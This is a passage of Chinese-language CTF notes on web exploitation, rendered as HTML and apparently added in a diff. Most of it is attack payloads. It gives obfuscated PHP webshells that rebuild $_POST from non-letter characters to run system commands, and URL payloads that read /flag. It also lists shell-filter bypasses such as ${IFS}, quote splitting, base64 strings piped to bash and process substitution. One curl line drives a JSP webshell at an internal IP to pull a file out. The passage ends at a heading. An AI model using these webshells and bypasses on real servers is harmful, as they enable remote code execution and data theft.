+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_</span>;   <span style="color:#828b96;font-style:italic">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;O&#34;，此时$__=&#34;O&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_PO&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;S&#34;，此时$__=&#34;S&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_POS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;T&#34;，此时$__=&#34;T&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_POST&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$$____</span>;   <span style="color:#828b96;font-style:italic">//$_=$_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span>(<span style="color:#58a1dd">$_</span>[<span style="color:#58a1dd">_</span>]);   <span style="color:#828b96;font-style:italic">//ASSERT($POST[_])
+</span></span></span></code></pre></div><p>强化</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">=++</span><span style="color:#58a1dd">$____</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">--</span><span style="color:#58a1dd">$__</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$____</span><span style="color:#ff636f">=</span>((<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>){<span style="color:#58a1dd">$__</span>};<span style="color:#828b96;font-style:italic">//NAN
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_____</span><span style="color:#ff636f">=++</span><span style="color:#58a1dd">$____</span>;<span style="color:#828b96;font-style:italic">//O
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$______</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#828b96;font-style:italic">//p
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_______</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#828b96;font-style:italic">//S
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$________</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#828b96;font-style:italic">//T
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_________</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$______</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_____</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_______</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$________</span>;<span style="color:#828b96;font-style:italic">//POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_________</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;_&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_________</span>;<span style="color:#828b96;font-style:italic">//_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">${$_________}</span>{<span style="color:#58a1dd">_</span>}(<span style="color:#58a1dd">${$_________}</span>{<span style="color:#58a1dd">__</span>});<span style="color:#828b96;font-style:italic">//$_POST[_]($_POST[__])
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">shell</span><span style="color:#ff636f">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">=++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">--</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$__</span>;<span style="color:#58a1dd">$____</span><span style="color:#ff636f">=</span>((<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>){<span style="color:#58a1dd">$__</span>};<span style="color:#58a1dd">$_____</span><span style="color:#ff636f">=++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#58a1dd">$______</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#58a1dd">$___</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">____</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#58a1dd">$________</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#58a1dd">$_________</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$______</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_____</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_______</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$________</span>;<span style="color:#58a1dd">$_________</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">_&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_________</span>;<span style="color:#58a1dd">${$_________}</span>{<span style="color:#58a1dd">_</span>}(<span style="color:#58a1dd">${$_________}</span>{<span style="color:#58a1dd">__</span>});<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">__</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">flag</span></span></span></code></pre></div><p>究极强化</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">_</span>)[<span style="color:#58a1dd">_</span>]; <span style="color:#828b96;font-style:italic">//N
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>; <span style="color:#828b96;font-style:italic">//o
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>;<span style="color:#828b96;font-style:italic">//PO
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">.++</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.++</span><span style="color:#58a1dd">$_</span>;<span style="color:#828b96;font-style:italic">//_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">_</span>](<span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">__</span>]);<span style="color:#828b96;font-style:italic">//$_POST[$_POST[__]] 注意。这里的__也可以替换成%FA这样的特殊字符减少一个字符占用
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">_</span>)[<span style="color:#58a1dd">_</span>];<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;$<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span>$<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">.%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#58a1dd">$_</span>;<span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">_</span>](<span style="color:#58a1dd">$$_</span>[<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span>]);<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span><span style="color:#ff636f">&amp;%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">flag</span></span></span></code></pre></div><h5 id="命令执行bypass" class="heading-element"><span>0.0.0.6  命令执行bypass</span>
+  <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8cbypass" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="拼接" class="heading-element"><span>0.0.0.6.1  拼接</span>
+  <a href="#%e6%8b%bc%e6%8e%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>a=c;b=at;c=flag;$a$b $c</p>
+</blockquote>
+<h6 id="base64编码" class="heading-element"><span>0.0.0.6.2  base64编码</span>
+  <a href="#base64%e7%bc%96%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>cat flag  编码为  Y2F0IGZsYWc</p>
+<blockquote>
+<p>`echo &ldquo;Y2F0IGZsYWc=&quot;|base64 -d`</p>
+</blockquote>
+<blockquote>
+<p>echo &ldquo;Y2F0IGZsYWc=&quot;|base64 -d|bash</p>
+</blockquote>
+<h6 id="单引号双引号" class="heading-element"><span>0.0.0.6.3  单引号、双引号</span>
+  <a href="#%e5%8d%95%e5%bc%95%e5%8f%b7%e5%8f%8c%e5%bc%95%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>c&quot;&ldquo;at flag</p>
+</blockquote>
+<blockquote>
+<p>c&quot;&ldquo;at fl&quot;&ldquo;ag</p>
+</blockquote>
+<blockquote>
+<p>c&quot;&ldquo;at fl&rsquo;&lsquo;ag</p>
+</blockquote>
+<h6 id="反斜线" class="heading-element"><span>0.0.0.6.4  反斜线</span>
+  <a href="#%e5%8f%8d%e6%96%9c%e7%ba%bf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>c\at fl\ag</p>
+</blockquote>
+<h6 id="ifs" class="heading-element"><span>0.0.0.6.5  ${IFS}</span>
+  <a href="#ifs" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>$IFS在linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个丹就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
+<blockquote>
+<p>cat${IFS}flag</p>
+</blockquote>
+<blockquote>
+<p>cat${IFS}$9flag</p>
+</blockquote>
+<blockquote>
+<p>cat$IFS$9flag</p>
+</blockquote>
+<h6 id="重定向符" class="heading-element"><span>0.0.0.6.6  重定向符&lt;&gt;</span>
+  <a href="#%e9%87%8d%e5%ae%9a%e5%90%91%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>cat&lt;&gt;flag</p>
+</blockquote>
+<blockquote>
+<p>cat&lt;flag</p>
+</blockquote>
+<h6 id="利用已存在的资源" class="heading-element"><span>0.0.0.6.7  利用已存在的资源</span>
+  <a href="#%e5%88%a9%e7%94%a8%e5%b7%b2%e5%ad%98%e5%9c%a8%e7%9a%84%e8%b5%84%e6%ba%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>从已有的文件或者环境变量中获得相应的字符。</p>
+<h6 id="管道符命令分隔符" class="heading-element"><span>0.0.0.6.8  管道符&amp;命令分隔符</span>
+  <a href="#%e7%ae%a1%e9%81%93%e7%ac%a6%e5%91%bd%e4%bb%a4%e5%88%86%e9%9a%94%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>1.==%Oa==符号换行符</p>
+<p>2.==%Od==符号回车符
+3.==;==符号在shell中，担任&quot;连续指令&quot;功能的符号就是&quot;分号”
+4.==&amp;==符号&amp;放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个&rsquo;&amp;&ldquo;实现这个目的。进程切换到后台的时候，我们把它称为job。切换到后台时会输出相关job信息
+5.==|==符号管道符左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示
+6.==&amp;&amp;==表示前一条命令执行成功时，才执行后一条命令
+7.==||==表示上一条命令执行失败后，才执行下一条命令</p>
+<p>8.命令终止符==%00%20#==</p>
+</blockquote>
+<blockquote>
+<p>多命令执行符              格式                        作用
+;               命令1;命令2             不错的命令都会执行
+&amp;&amp;               命令1&amp;&amp;命令2            逻辑与：当命令1正确执行后，命令2才会正确执行，否则命令2不会执行
+||               命令1||命令2            逻辑或：当命令1不正确执行后，命令2才会正确执行，否则命令2不会执行</p>
+</blockquote>
+<blockquote>
+<p>windows:</p>
+<p>| 前后两个都执行</p>
+<p>||  执行前面的，前面的错误就执行后面的</p>
+<p>&amp;&amp;  前面的执行完执行后面的</p>
+</blockquote>
+<h5 id="无管道符" class="heading-element"><span>0.0.0.7  无管道符</span>
+  <a href="#%e6%97%a0%e7%ae%a1%e9%81%93%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>bash &lt; &lt;(base64 -d &lt; &lt;(echo bHMg))，等价 echo bHMg | base64 -d | bash，不使用管道符 |</p>
+<h5 id="下载文件" class="heading-element"><span>0.0.0.8  下载文件</span>
+  <a href="#%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>参考</p>
+<p><code>curl http://192.168.16.218:8005/ye.jsp?cmd=base64 -w0 /usr/sbin/flag.rar|xargs echo|base64 -d &gt; flag2.rar</code></p>
+<h5 id="other-tricks" class="heading-element"><span>0.0.0.9  other tricks</span>
